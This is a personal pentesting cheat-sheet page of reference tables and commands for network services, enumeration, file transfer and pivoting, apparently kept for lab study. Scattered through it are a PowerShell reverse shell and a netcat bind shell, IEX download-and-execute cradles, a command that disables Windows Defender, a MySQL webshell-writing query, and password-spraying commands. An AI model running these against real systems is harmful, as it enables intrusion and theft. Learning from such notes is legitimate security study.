---
layout: default
title: Personal Pentesting Archive
date: 2025-07-28 16:00:00 +0000
categories: jekyll update
permalink: /pentestnotes
---
# Pentesting Tools

## Shell
Program that takes input from user and passes commands off to the system.

## Port

Ports are virtual points where network connections begin and end. 

>Ports 1024 and below are only able to be used as root for a host

Common ports

| Port | Type | Common services|
|------|------|----------------|
20|TCP|FTP data channel
21|TCP|FTP control channel
22|TCP|SSH
23|TCP|Telnet
25|TCP|SMPT
43|TCP|whois
53|TCP/UDP|DNS queries, zone transfers
80|TCP|HTTP
88|TCP|Kerberos
110|TCP|pop3
111|TCP/UDP|ONC-RPC/SUN-RPC
135|TCP|SMB
137|UDP|Samba
138|UDP|Samba
139|TCP|SMB
143|TCP|IMAP/POP3
161|TCP/UDP|SNMP
162|UDP|Sends SNMP traps
389|TCP/UDP|LDAP(Active Directory)
443|TCP|SSL/TLS(HTTPs)
445|TCP|SMB
465|TCP|SMTP Encrypted
512|TCP|R-services
513|TCP|R-services
514|TCP|R-services
587|TCP|Newer SMTP servers
623|UDP|IPMI
873|TCP|Rsync
993|TCP|TLS/SSL Encrypted IMAP
995|TCP|TLS/SSL Encrypted POP3
1433|TCP|MSSQL
1521|TCP|Oracle TNS
2049|TCP/UDP|NFSv4
3306|TCP|MySQL
3389|TCP|Microsoft RDP
5985|TCP|WinRM
5986|TCP|WinRM
8080|TCP|HTTP alt
27017|TCP|MongoDB

Default Webroots

Web server|Webroot
-|-
Apache|`/var/www/html`
Nginx|`/usr/local/nginx/html/`
IIS|`c:\inetpub\wwwroot\`
XAMPP|`C:\xampp\htdocs\`

Cheat Sheets:
- [PDF](https://packetlife.net/media/library/23/common-ports.pdf)
- [WEB](https://www.stationx.net/common-ports-cheat-sheet/)
- [nmap specific](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/)

## OSI Network Model
No.|Name|Function|Examples
-|-|-|-
1|Application Layer|Provides end user content|HTTP, SSH
2|Presentation|Translation|SSL, Gif, JPEG
3|Session|Syncs applications|API, NetBIOS
4|Transport|Ensures end to end communication between systems|TCP, UDP
5|Network|Logical Routing|IP, ICMP
6|Data link|Manages access, error detection, framing|Ethernet, PPP
7|Physical|Electrical impulses that send data|Wires

## Web Servers

Application that runs in the back end which handles http(s) traffic from client side browsers

### Owasp Top 10

No.|Name|Description|Example
---|----|------------|-------
1|Broken Access Control| Restrictions not properly implemented to prevent users from accessing other users
2|Cryptographic Failures| Borked encryption
3|Injection|Lack of parsing user input leads to commands being injected|SQLi LDAPi
4|Insecure design|Not designed with security in mind
5|Security Misconfiguration|Insecure default configurations for security tools|Detailed error messages
6|Vulnerable and Outdated Components|Not updating, or using vulnerable components
7|Identification and Authentification failure|Authentication and session management misconfigurations|Stealing session tokens
8|Software and data integrity failures|Code and infrastructure which does not protect against integrity violations|Plugins,libraries and modules from 3rd party sources which may not be secure
9|Security Logging and Monitoring Failures|Need to be able to detect, escalate and respond to active breaches|Log monitoring, message signing
10|Server side request forgery|Web applications that fetch remote resources without validating the user URL

## File Transfer

### Windows using PowerShell

A simple technique is to encode a file into a base 64 string, and then decode it on the machine we wish to transfer the file to.

Create hash: `md5sum file`.

To convert into base64: `cat file|base64 -w 0;echo`

We then use the PowerShell command `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZ"))`

Note: We are often limited by the amount of characters we can paste into the terminal.

#### PowerShell System.Net.WebClient Commands

Method|Description
-|-
OpenRead|Returns data from resource as a Stream
OpenReadAsync|Returns data from a resource without blocking the calling thread
DownloadData|Downloads data and returns a Byte array
DownloadDataAsync|Downloads data, returns Byte array, doesn't block calling thread
DownloadFile|Downloads data to a local file
DownloadFileAsync|Downloads data to a local file, doesn't block calling thread
DownloadString|Downloads a String from a resource and returns a String
DownloadStringAsync|Downloads a String from a resource without blocking the calling thread

Example: `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`

We can run a file in memory without downloading using IEX.

`IEX (New-Object Net.WebClient).DownloadString('https://website.com')`

Similarly, new version of PowerShell have `Invoke-WebRequest`

`Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX`

Should we get a parsing erro we can fix using: `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`

Similarly, we can bypass a SSL/TLS certificate verification check using: '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}'

## DNS

Globally distributed DNS servers translate domain names into IP adresses.

Bind9 is a common DNS server. [List of possible vulns](https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64)

[List of common DNS vulns](https://securitytrails.com/blog/most-popular-types-dns-attacks)

### DNS configuration

Zones are ways of logically subdividing DNS into different files. A zone file is a text file which descrbies a DNS zone with a BIND file format. A zone must have one SOA and one NS record. In simple terms, the DNS zone file is a phonebook where the DNS server looks up addresses for the domains it is searching for.

Important Settings
Option|Description
-|-
allow-query|Defines which hosts are allowed to send requests to the DNS server.
allow-recursion|Defines which hosts are allowed to send recursive requests to the DNS server.
allow-transfer|Defines which hosts are allowed to receive zone transfers from the DNS server.
zone-statistics|Collects statistics

### Types of DNS servers
Server Type|Description
-|-
DNS Root Server|The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe.
Authoritative Nameserver|Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.
Non-authoritative Nameserver|Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.
Caching DNS server|Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.
Forwarding Server|Forward DNS query to another server
Resolver|Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.

### Types of DNS records
>These records can be accessed through tools such as dig

DNS Record|Description
-|-
A|IPv4 address
AAAA|IPv6 adress
MX|Mail Servers
NS|DNS servers of domain
TXT|Text containing various information
CNAME|alias of the name
PTR|Converts IP into valid domain names
SOA|Provides information about DNS zone and email address of administrative contact

### dig
We can use `dig any website.com` to enumerate DNS records.

Example: `dig <record type> domain.com @ip`
Can use `any` as the record to view all avaliable

`dig axfr domain.com @10.10.10.10` queries the Asynchronous Full Transfer Zone (AXFR)

### DNS Zone Transfer

Zone files are kept identical on several different name servers. When changes are made, zone files are transfered over to other name servers to maintain integrity. The original data is located on a server called the primary serer.

### Sub Domain Brute Force
Bash for loop: `for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.domain.com @10.10.10.10 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done`
Subfinder: `./subfinder -d inlanefreight.com -v`

### Fierce
Automates some of the DNS enumeration: `fierce --domain zonetransfer.me`

### DNS Poisoning 

We can use tools such as Ettercap to poison a local DNS server. We first edit the `/etc/ettercap/etter.dns` to map the target domain name that we want to spoof and the attacker's IP address.

We can then start the Ettercap tool and using the `dns_spoof` plugin we can spoof the DNS address.

## SSH
Secure Shell (SSH) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port TCP 22.

Good tool to fingerprint the service is `ssh-audit`

Port forwarding on ssh: `ssh -L 1234:localhost:3306 ubuntu@10.129.202.64`

Port forwarding with multiple hosts on ssh: `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`

### OpenSSH
OpenBSD SSH server on Linux distros is an open source fork of the original and commercial SSH.

Authentication methods:
1. Password
2. Public-key
3. Host-based
4. Keyboard
5. Challenge-response
6. GSSAPI

#### OpenSSH Configuration
Typically stored in `/etc/ssh/sshd_config`

Dangerous Settings:
Setting|Value type|Description
-|-|-
PasswordAuthentication|bool|
PermitEmptyPasswords|bool|
PermitRootLogin|bool
Protocol|1 or 2|SSH-1 or SSH-2
X11Forwarding|bool|Allows X11 forwarding for GUI apps
AllowTcpForwarding|bool|Allows forwarding of TCP ports
PermitTunnel|bool|
DebianBanner|bool|Displays a specific banner when logging in

## Netcat
Network utility for interacting with TCP/UDP Ports. 

- `-l` listen mode
- `-v` verbose mode
- `-n` disable DNS resolution and only connect from/to IPs, to speed up connection
- `-p` to specify port for netcat

> `nc -lvnp 1234` sets up a listener on the local host at port 1234

[Windows binary](https://nmap.org/download.html)

Connect to an open port: `nc 10.10.10.10 22`
> add `-nv` flag to grab banner

In order to create a bind shell:`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`

Powershell code to connect to a reverse shell: 

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

Disabling the AV should it block the connection: `Set-MpPreference -DisableRealtimeMonitoring $true`

### Transfer file using NetCat

Setting up a listener on the victim machine: `nc -l -p 8000 > file.txt`

If using Ncat we add: `ncat -l -p 8000 --recv-only > file.exe`

Sending the file: `nc -q 0 192.168.49.128 8000 < file.exe`

Using Ncat: `ncat --send-only 192.168.49.128 8000 < file.exe`

We can also connnect first before listening:

`sudo nc -l -p 443 -q 0 < file.exe`

On target to download" `nc 192.168.10.10 443 > file.txt`, or we can use dev/tcp on bash to recieve the file `cat < /dev/tcp/192.168.10.10/443 > file.exe`

### [PowerCat](https://github.com/besimorhino/powercat)
Windows alternative

### Socat

Several features that nc does not support such as port forwarding and serial connections.

[Upgrading socat shell to TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat)

[Standalone Binary](https://github.com/andrew-d/static-binaries)


### Ncat 
A modern reimplementation of netcat

## Tmux
Terminal multiplexer which can create multiple windows from a single terminal session.
> See also: Screen

- Default prefix to open a new window `CTRL+B`
- Hit prefix and number for a specific window
- `SHIFT + %` for a vertical split, `SHIFT + "` for horizontal

[Cheat Sheet](https://tmuxcheatsheet.com/)

## Sshuttle
A tool written in Python which can be used to pivot over SSH.

Usage: `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v`

## Rpivot

Pivoting tool which creates a proxy webserver

Creation of server: `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`

On pivot point: `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`


## NMAP

Swiss army knife of network mapping

- `-sU` flag for UDP scan
- `-sV` service scan
- `-sC` default script scan
- `-sS` SYN scan
- `-sT` TCP connect scan
- `-sN` TCP Null scan
- `-sF` TCP FIN scan
- `-sX` TCP Xmas scan
- `-sO` IP protocol scan
- `-oN` normal output
- `-oX` xml output
- `-oA` all output
- `-iL` grab targets from list
- `-PS` specify ping scan
- `-PA` TCP ACK scan
- `-PE` only ICMP echo requests
- `-PU` only UDP 
- `-Pn` skip host discovery
- `-sn` disable port scanning
- `-O` OS version
- `-n` Disable DNS resolution
- `-F` scans only the top 100 ports
- `-D RND:5` Generates 5 random IP addresses that indicates the source of the nmap connectionk
- `-S` Specify source IP

- `--packet-trace` Show all packets sent and received  
- `--reason` Displays the reason for a particular result
- `--top-ports=` Specifies the number of top ports to scan from the nmap database
- `--max-retries=` Set the number of times to retry should a packaet get dropped
- `--disable-arp-ping` Disables ARP ping
- `--stats-every=5s` Shows progress of scan every 5 seconds
- `--initial-rtt-timeout 50ms` Sets the specified value as the initial RTT(Round-trip time) timeout
- `--max-rtt-timeout` Sets the specified value as the max RTT timeout
- `--min-rate` Sets the minimum number of packets per second
- `--dns-server` Specify DNS server
- `--source-port` Specify port from which to scan, can be helpful to use port 53
- `--script-trace` Scan history from scripts
- `--smtp-open-relay` Test if a STMP server is a open relay
- `--open` Only show hosts that have open ports, and only show the open ports for those.

> xml output is needed to import into metasploit

Banner Grabbing: `nmap -sV --script=banner <target>`

Host discovery: `sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5`

State|Description
-|-
open|This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.
closed|When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.
filtered|Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.
unfiltered|This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.
open\|filtered|If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.
closed\|filtered|This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.

### NMAP scripts

Find nmap scripts: `find / -type f -name ftp* 2>/dev/null | grep scripts`

#### Script categories
Category|Description
-|-
auth|Finding authentication credentials
broadcast|Scripts which are used for host discovery and can then be automatically added to the remaining scans
brute|Scripts which try to log in by brute forcing credentials
default|The scripts executed by `-sC`
discovery|Evaluation of accessible services
dos|Check service for DOS. WILL HARM SERVICE
exploit|Tries to exploit known vulnerabilities for scanned port
external|Scripts that use external services for further processing
fuzzer|Identifies vulnerabilities and unexpected packet handling by sending different fields. Takes a while.
intrusive|Intrusive scripts that could negatively affect the target
malware|Check if system is infected with malware
safe|Defensive scripts that are... safe
version|Extension for service detection
vuln|Identification of specific vulnerabilities 
> To use categories simply put it in the script name: `--script <category>`
#### Specific Scripts
Script|Notes
-|-
updatedb|Updates the nmap script database
smb-os-discovery.nse|
smb-protocols|
smb-enum-users|
smb-server-status|
smb-enum-domains
smb-enum-groups
smb-enum-services
ftp-brute
ftp-anon
ftp-syst|Executes ftp status command
ssh-hostkey
ssh-auth-methods
http-headers
http-enum
smtp-commands|Determines which commands can the SMPT server execute
nfs* |nfs scripts
oracle-sid-brute|
ipmi-version|

## SMB

Windows service for sharing resources across networks. Regulates access to networks, files and other resources. Each host participates in a workgroup: an arbitrary collection of computers and their resources on a network.

Network Basic Input/Output System(NetBIOS) is an API developed my IBM to provide a blueprint for an application to connect and share data with other computers.

### Setting up an SMB server

No username: `sudo impacket-smbserver share -smb2support /tmp/smbshare`

Username: `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`

We can then transfer the file onto the Windows machine using: `copy \\192.168.220.133\share\file.txt`

Alternatively we mount the server before using the copy command: `net use n: \\192.168.220.133\share /user:test test

### smbclient

Interacts and enumerates smb shares.
- `-L` flag lists shares
- `-N` flag suppresses the password prompt
- `-U` specicies user

To enumerate: `smbclient -N -L \\\\10.10.10.10`

To connect: `smbclient \\\\10.10.10.10\\sharename`

Can use `!<cmd>` to execute local system commands

### SMB Map
Python CLI tool

Format:`smbmap -u guest -p ' ' -H`

- `-x` to run command
- `-L` to list
- `-r`
- `--upload`
- `--download`

### SAMBA
Linux version of SMB, typically appearing on UDP 137,138

#### [Samba Settings](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html):
Setting|Type|Description
-|-|-
[sharename]|string|Name of the network share
workgroup|SMB path|Workgroup that will appear when clients query
path|path|direcotry to which user is given access
server string|string|The string that will show up when a connnection is initiated
unix password sync|bool|Sync the UNIX password with the SMB password?
usershare allow guests|bool|Allow non-authenticated users to access defined share?
map to guest|string?|What to do when a user login request doesn't match a valid UNIX user?
browseable|bool|Should this share be shown in list of avaliable shares
guest ok|bool|Guest access without a password?
read only|bool|
create mask|int|What permissions to set for newly created files?
writeable|bool|
enable privileges|bool|
directory mask|int|What permissions to assign to newly created directories
logon script|script path|Script to execute on user login
magic script|script path|??
magic output|path|Where is the output of the magic script to store

### rpcclient

Tool to perform Microsoft Remote Procedure Call(MS-RPC) functions.

To connnect: `rpcclient -U "" 10.10.10.10`

To search for null bind: `rpcclient -U "" -N 10.10.10.10`

Query|Description
-|-
srvinfo|Server information
enumdomains|Enumerate all domains deployed in network
querydominfo|Provides information of deployed domains.
netshareenumall|Enumerate all avaliable shares
netsharegetinfo \<share>|Provides information about a specific share
enumdomusers|Enumerates all domain users
queryuser \<RID>|Provides information about a specific user

Brute force user RID's: `for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done`

### Impacket PSexec
More SMB enumeration.

Connect with `impacket-psexec administrator:'Password123!'@10.10.110.17`

## Netsh.exe

Windows command line tool which allows network configuration of a particular Windows system.

On victim computer we can set up port forwarding: `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25`

Verified with: `netsh.exe interface portproxy show v4tov4`

## DNS     

## NFS
Network File System(NFS) developed by Sun Microsystmes and has the same purpose as SMB. Typically used between Linux and Unix systems, and cannot communicate directly with SMB.

NFS is based on the Open Network Computing Remote Procedure call(ONC-RPC/SUN-RPC) protocol, on TCP/UDP ports 111. The NFS has no authentication, and it is shifted onto the RPC protocol options. Commonly this is done through UNIX UID/GID memberships, however the client and server might not hve the same UID/GID mappings, meaning use outside a trusted network is dangerous.

Show avaliable NFS shares: `showmount -e 10.10.10.10`

Mount MFS share: `sudo mount -t nfs 10.10.10.10:/ ./target-NFS/ -o nolock`
### NFS Settings
Options|Description
-|-
rw|Read/write permissions
ro|Read only permission
sync|Synchronous data transfer
async|Asynchronous data transfer
secure|Ports above 1024 will not be used
insecure|Ports above 1024 will be used
no_subtree_check|Disables the checking of subdirectory trees
root_squash|Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount
nohide|If another file system was mounted below and exported directory, this directory is exported by its own exports entry
no_root_squash|All files created by root are kept with UID/GID 0

## Rsync
Rsync is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts.

We can find open shares with netcat, and then list them using `rsync -av --list-only rsync://127.0.0.1/share

## R-Services
R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP. Initially developed by the Computer Systems Research Group (CSRG) at the University of California, Berkeley, r-services were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (SSH) protocols and commands due to inherent security flaws built into them. Much like telnet, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (MITM) attacks.

The `/etc/hosts.equiv` file contains a list of trusted hosts and is used to grant acces to other systems on the network

### r-commands

Suite of programs to access R-services

Command|Service Daemon|Port|Transport Protocol|Description
-|-|-|-|-
rcp|rshd|514|TCP|Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the cp command on Linux but provides no warning to the user for overwriting existing files on a system.
rsh|rshd|514|TCP|Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the /etc/hosts.equiv and .rhosts files for validation.
rexec|rexecd|512|TCP|Enables a user to run shell commands on a remote machine. Requires authentication through the use of a username and password through an unencrypted network socket. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files.
rlogin|rloginid|513|TCP|Enables a user to log in to a remote host over the network. It works similarly to telnet but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files.
rstat||||
ruptime
rwho
rusers

## SNMP
Provide information and statistics about a router or device. Created to monitor network devices, and additionally can be used to handle config tasks or switch settings remotely.

>In SNMP versions 1 and 2c, access is controlled using a plaintext community string. Encryption and authentication was only added in SNMP version 3.

### MIB
To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.

### Dangerous Configurations
Setting|Description
-|-
rwuser noauth|Provides access to the full OID tree without authentication
rwcommunity \<community string> \<IPv4 address>|Provides access to the full OID tree regardless of where the requests were sent from.

### snmpwalk

Queries OID's for their information: `snmpwalk -v2c -c public 10.10.10.10` where `v2c` specifies the version of SNMP used.

### onesixtyone
Used to brute-force the names of the community strings: `onesixtyone -c /path/to/wordlist.txt 10.10.10.10`

### Braa
Used to brute force individual OID's to enumerate the information behind them:`braa \<community string>@10.10.10.10:.1.3.6.*`

## SMTP
Simple Mail Transfer protocol, sends emails on an IP network. SMTP works unecrypted, however SSL/TLS encryption is standard.

 After sending his e-mail, the SMTP client, also known as Mail User Agent (MUA), converts it into a header and a body and uploads both to the SMTP server. This has a so-called Mail Transfer Agent (MTA), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a Mail Submission Agent (MSA), which checks the validity, i.e., the origin of the e-mail. This MSA is also called Relay server. 

Two main issues:
1. Sending using SMTP does not return a delivery confirmation. 
2. Users are not authenticated when a connection is established and the sender of an email is therefore unreliable.

When discussing SMTP we usually mean Extended SMTP(ESMTP). this uses TLS to initiate an SSL-protected SMTP connection.

To interact with an SMTP server we can use `telnet` to initialize a TCP connection. We can sometimes use the command `VRFY` to enumerate users by bruteforce.

### SMTP Commands
Command|Description
-|-
AUTH PLAIN|AUTH is a service extension used to authenticate the client
HELO|The client logs in with its computer name and thus starts the session.
MAIL FROM|The client names the email sender
RCTP TO|Specify recipient
DATA|Initiate transmission
RSET|Abort the initiated transmission but keep the connection open
VRFY|The client checks if a mailbox is avaliable for message transfer
EXPN|Check if mailbox is avaliable for messaging
NOOP|Request response from server to prevent disconnection due to time-out
QUIT|Terminate session

### [SMTP Response Codes](https://serversmtp.com/smtp-error/)

## IMAP/POP3
IMAP allows online management of emails directly on the server and supports folder structures.

POP3 is similar, but only allows for listing, retrieving and deleting emails as functions the email server.

We can use `cURL` to get information on these servers: `curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v`

We can use `openssl` to interact with the servers over SSL

- POP3: `openssl s_client -connect 10.10.10.10:pop3s`
- IMAP: `openssl s_client -connect 10.10.10.10:imaps`

### IMAP Commands
Command|Description
-|-
LOGIN username password|User's login
LIST "" * |Lists all directories
CREATE "INBOX"|Creates a mailbox with a specified name
DELETE "INBOX"|Deletes a mailbox
RENAME "A" "B"|Renames a mailbox
LSUB "" * | Returns a subset of names from the set of names that the User has declared as being active or subscribed
SELECT INBOX|Selects a mailbox so that messages can be accessed
UNSELECT INBOX|Exits the selected mailbox
FETCH \<ID> all|Retrieves data associated with a message in the mailbox
CLOSE|Removes all messages with the delete tag set
LOGOUT|Close connection

### POP3 Commands
Command|Description
-|-
USER username|Identifies the user
PASS password|Authentication of the user using its password
STAT|Requests the number of saved emails
LIST|Lists the number and size of all emails
RETR id|Deliver requested email
DELE id|Delete requested dmail
CAPA|Display server capabilities
RSET|Reset the transmitted info
QUIT|Close connection

### Dangerous Configs
Setting|Description
-|-
auth_debug|Enables all authentication debug logging
auth_debug_passwords|This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.
auth_verbose|Logs unsuccessful authentication attemps and their reasons
auth_verbose_passwords|Passwords used for authentication are logged and cannot be truncated
auth_anonymous_username|Specifies username to be used when logging in with the ANONYMOUS SASL mechanism

### O365 Spray

Username enumartion and password spraying aimed at Microsoft Office 365

Usage: `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz `
Usage for Password:`python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`

## PsExec
Lightweight Telnet replacement. Authentication through SMB. With proper credentials, psexec will execute commands.

## FTP
File sharing protocol, typically port 21. This is a cleartext protocol.

Active connection: The client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. 

Passive Mode: Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.

To connect: `ftp 10.10.10.10`

Default connection is done through username and password both being `anonymous`.

Download all files from ftp server: `wget -m --no-passive ftp://anonymous:anonymous@10.129.14.13`

### pyftpdlib
Python3 based FTP server. Starting the server: `sudo python3 -m pyftpdlib --port 21`

Powershell command that we use to download the file: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

Creating a command file on Windows:

1. `echo open 192.168.10.10 > ftpcommand.txt
2. `echo USER anonymous >> ftpcommand.txt
3. `echo binary >> ftpcommand.txt`
4. `echo GET file.txt >> ftpcommand.txt`
5. `echo bye >> ftpcommand.txt`
6. `ftp -v -n -s:ftpcommand.txt`
7. `open 192.168.10.10`

### FTP Commands
Command|Notes
-|-
status
debug
trace
get
put


### TFTP

Trivial file transfer protocol. Simpler than ftp, performs file transfers between client and server. Does NOT offer authentication methods. Uses UDP. Permissions are set solely based on the read write permissions of a file in the operating system.

### vsFTPd

One of the most common FTP servers on Linux-based distributions. Configuration file is typically stored in `/etc/vsftpd.conf`

> See also `/etc/ftpusers`

#### vsFTPd Settings
Setting|Value Type|Description
-|-|-
listen|bool|Run from inetd or as a standalone daemon?
listen_ipv6|bool|Listen on IPv6?
anonymous_enable|bool
anon_upload_enable|bool
anon_mkdir_write_enable|bool
no_anon_password|bool
anon_root|path
write_enable|bool|Allow the usage of FTP COMMANDS: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?
local_enable|bool|Allow local users to login?
chroot_local_user|bool|Place local users into their home directory?
chroot_list_enable|bool|Use a list of local users that will be placed in their home directory?
dirmessage_enable|bool|Display active directory messages when users go into certain directories?
chown_uploads|bool|Change ownership of anonymously uploaded files?
chown_username|string|User who is given ownership of anonymously uploaded files
use_localtime|bool
xferlog_enable|bool|Activate logging of uploads/downloads?
connect_from_port_20|bool
secure_chroot_dir|path|Name of an empty directory
pam_service_name|string|Name of the PAM(Privelged access service) service that vsftpd will use
rsa_cert_file|path|Location of RSA certificate for SSL encrypted connections
rsa_private_key_file|path
ssl_enable|bool
hide_ids|bool|Display user and group information in directory listings as "ftp"?
ls_recurse_enable|bool|Allow use of recurse listings? (Done through the `ls -R` command)

[FTP return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)
## MySQL
Database commonly used in conjunction with other services. Works using the client-server principle and consists of a MySQL server with one or more MySQL clients.

We can access the database through the command: `mysql -u root -ppassword -h 10.10.10.10`. No space between `-p` and the password

Windows command: `sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30`

### MySQL Commands
Command|Description
-|-
show databases;|
use \<database>;
show tables|Show all tables in selected db
show columns from \<table>;|Shows all columns in the selected db
select * from \<table>;|Show everything from specified table
select * from \<table> where \<column> = "\<string>";|Search for string in the desired table

### Writing/Reading local files
Creating a webshell? SELECT `"<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';`

Read file: `select LOAD_FILE("/etc/passwd");`

### Dangerous Configurations
Setting|Description
-|-
user|Sets which user the MySQL service will run as
password|Sets the password for the MySQL server
admin_address|The IP address on which to listen for connections
debug|Indicates current debug settings
sql_warnings|Controls whether single row INSERT statements produce an information string if warnings occur
secure_file_priv|Variable used to limit the effect of data import and export operations

Note: user,password and admin_address are written in plain text.

## MSSQL
Proprietary SQL-based relational database developed by Microsoft. 

Can connect through:`python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth`

Detailed nmap scan: `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.10`

Alternatively: `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`

Specifically using a local Windows account: `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`

Alternatively: `mssqlclient.py -p 1433 julio@10.129.203.7`

Additionally we can use the mssql_ping Metasploit module to enumerate.

Note, MSSQL has the `xp_cmdshell 'command'` for RCE
### MSSQL Default Databases
Name|Description
-|-
master|Tracks all system information for an SQL server instance
model|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database
msdb|The SQL Server Agent uses this db to schedule jobs and alerts
resource|Read only db containing system objects

### Impersonating Users
Identifying users we can impersonate:
1. `SELECT distinct b.name`
2. `FROM sys.server_permissions a`
3. `INNER JOIN sys.server_principals b`
4. `ON a.grantor_principal_id = b.principal_id`
5. `WHERE a.permission_name = 'IMPERSONATE'`

Viewing current user and role:
1. `SELECT SYSTEM_USER`
2. `SELECT IS_SRVROLEMEMBER('sysadmin')

Impersonating the SA user:
1. `EXECUTE AS LOGIN = 'sa'`
2. `SELECT SYSTEM_USER`
3. `SELECT IS_SRVROLEMEMBER('sysadmin')`

### Communication with Other Databases
Identify Linked servers in MSSQL: `SELECT srvname, isremote FROM sysservers`

## [Time to Live by OS](https://subinsb.com/default-device-ttl-values/)

Useful for host discovery and identification 

## fping

Utilizes ICMP requests/replies to reach out and interact with the host. Better than `ping` in its ability to handle multiple hosts and script.

Flags: 

- `-a` show targets that are alive
- `-s` print stats
